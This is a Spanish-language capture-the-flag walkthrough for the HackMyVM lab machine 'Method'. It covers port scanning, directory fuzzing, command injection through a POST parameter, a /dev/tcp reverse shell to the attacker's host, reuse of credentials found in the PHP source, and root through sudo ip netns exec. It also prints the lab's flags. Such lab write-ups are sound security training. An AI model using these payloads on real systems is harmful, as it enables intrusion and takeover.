---
icon: flag
---

# Method HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 11:00 EDT
Nmap scan report for 192.168.1.236
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 4b:24:34:1f:41:10:88:b7:5a:6a:63:d9:f6:75:26:6f (RSA)
|   256 52:46:e7:20:68:c1:6f:90:2f:a6:ad:ee:6d:87:e7:28 (ECDSA)
|_  256 3f:ce:97:a9:1e:f4:60:f4:0e:71:e7:46:58:28:71:f0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Test Page for the Nginx HTTP Server on Fedora
MAC Address: 08:00:27:A6:FC:96 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

Veremos que hay una pagina web en el puerto `80`, si entramos veremos una pagina web normal, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,htm,php,txt -t 100 -k -r --exclude-length 3690
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.236/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3690
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.htm            (Status: 200) [Size: 344]
/note.txt             (Status: 200) [Size: 23]
/secret.php           (Status: 200) [Size: 13974]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes entre ellas `index.htm` si entramos veremos una pagina normal, pero si inspeccionamos el codigo veremos esto:

```html
<form action="[/secret.php](view-source:http://192.168.1.236/secret.php)" hidden="true" method="GET">
     <input type="text" name="HackMyVM" value="" maxlength="100"><br>
     <input type="submit" value="Submit">
</form>
```

Veremos que el `secret.php` puede hacer algo pero veremos algo interesante en el `name=` que pone `HackMyVM` por lo que vamos a probar lo siguiente:

```
URL = http://<IP>/secret.php?HackMyVM=whoami
```

Info:

```
Now the main part what it is loooooool  
Try other method
```

Veremos que no ha funcionado, pero por que no es el metodo adecuado, estamos utilizando el metodo `GET` por lo que vamos a probar a utilizar el metodo `POST` capturando la peticion con `BurpSuite`.

Una vez que tengamos abierto `BurpSuite` capturaremos la peticion recargando la pagina enviando el `whoami`, por lo que veremos lo siguiente:

```
GET /secret.php?HackMyVM=whoami HTTP/1.1
Host: 192.168.1.236
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Ahora vamos a darle `click` derecho -> `changue request method` y con esto nos quedara asi:

```
POST /secret.php HTTP/1.1
Host: 192.168.1.236
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

HackMyVM=whoami
```

Ahora vamos a probar a enviarlo y veremos lo siguiente:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 18 Apr 2025 15:18:47 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 38

You Found ME : - (<pre>www-data
</pre>
```

Por lo que vemos ha funcionado, ahora vamos a crearnos una `reverse shell` de la siguiente forma:

```
POST /secret.php HTTP/1.1
Host: 192.168.1.236
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

HackMyVM=bash+%20-c+%20"sh+%20-i+%20>%26+%20/dev/tcp/192.168.1.146/7777%20+0>%261"
```

Antes de enviarlo nos pondremos a la escucha con `nc`.

```shell
nc -lvnp <PORT>
```

Ahora cuando lo enviemos por `BurpSuite` si volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.236] 48638
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Vamos a leer la `flag` del usuario:

> user.txt

```
e4408105ca9c2a5c2714a818c475d06F
```

## Escalate user prakasaka

Si leemos el archivo `secret.php` veremos lo siguiente:

```shell
cd /var/www/html
cat secret.php
```

Info:

```php
<?php
if(isset($_GET['HackMyVM'])){
        echo "Now the main part what it is loooooool";
        echo "<br>";
echo "Try other method";
        die;
}
if(isset($_POST['HackMyVM'])){
        echo "You Found ME : - (";
        echo "<pre>";
        $cmd = ($_POST['HackMyVM']);
        system($cmd);
        echo "</pre>";
        die;
}
else {
header("Location: https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg");
}
$ok="prakasaka:th3-!llum!n@t0r";
?>
```

Veremos lo que parece las credenciales del usuario `prakasaka`, vamos a probarlo haciendo lo siguiente:

```shell
su prakasaka
```

Metemos como contraseña `th3-!llum!n@t0r` y veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for prakasaka on method:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User prakasaka may run the following commands on method:
    (!root) NOPASSWD: /bin/bash
    (root) /bin/ip
```

Veremos que podemos ejecutar el binario `ip` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo
```

Info:

```
Cannot create namespace file "/run/netns/foo": File exists
# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`:

> root.txt

```
fc9c6eb6265921315e7c70aebd22af7F
```
